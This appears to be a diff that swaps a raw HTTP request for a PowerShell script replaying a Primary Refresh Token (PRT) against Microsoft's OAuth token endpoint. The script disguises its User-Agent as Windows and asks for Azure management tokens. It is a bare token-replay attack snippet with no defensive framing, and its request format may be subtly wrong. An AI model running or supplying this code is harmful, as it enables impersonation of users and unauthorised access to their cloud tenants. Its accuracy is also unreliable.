@@ -1,4 +1,19 @@
-POST https://management.azure.com/subscriptions?api-version=2020-01-01 HTTP/1.1
-Host: management.azure.com
-x-ms-RefreshTokenCredential: eyJ0eXAiOiJKV1QiLCJhbGciOi...<snip>...O8g
-Content-Type: application/json
+$prt = "eyJ0eXAiOiJKV1QiLCJhbGciOi..."  # Base64 PRT blob
+$uri = 'https://login.microsoftonline.com/common/oauth2/token'
+
+$headers = @{
+    "x-ms-RefreshTokenCredential" = $prt
+    "client-request-id" = [guid]::NewGuid().ToString()
+    "User-Agent" = "WindowsShell/10.0"  # Mimic Windows
+}
+
+$body = @{
+    grant_type    = "refresh_token"
+    client_id     = "some-client-id"   # e.g., Windows Shell
+    refresh_token = $prt
+    scope         = "openid profile offline_access"
+    resource      = "https://management.core.windows.net/"
+}
+
+Invoke-RestMethod -Method POST -Uri $uri -Headers $headers -Body $body
+
